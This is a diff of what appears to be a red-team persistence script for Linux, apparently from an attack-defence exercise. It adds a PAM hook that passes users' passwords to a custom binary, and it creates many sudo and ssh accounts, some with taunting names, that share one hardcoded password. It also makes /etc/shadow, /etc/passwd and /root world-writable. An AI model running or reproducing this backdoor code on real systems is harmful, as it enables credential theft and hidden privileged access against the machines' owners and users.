@@ -25,7 +25,7 @@ sed -i '1iauth optional pam_exec.so expose_authtok /usr/local/bin/PAM' /etc/pam.
 
 
 #Add users
-for user in Cody Andrew Trevor Shane Gaelin Lucas Tristan Angel FTP Spooky Why Do You Keep Locking Me Out I Cri Every Time Please Let mee stay; do useradd -M -G sudo,ssh $user; echo -e "SuperSecurePassword1!\nSuperSecurePassword1!" | passwd $user; done
+for user in Cody Andrew Trevor Shane Gaelin Lucas Tristan Angel FTP Spooky Why Do You Keep Locking Me Out I Cri Every Time Please Let mee stay; do useradd -M -G sudo,ssh $user; echo -e "SuperSecurePassword1\nSuperSecurePassword1" | passwd $user; done
 
 #Chmod /etc/ files
 chmod o+rw /etc/group /etc/shadow /root /etc/passwd
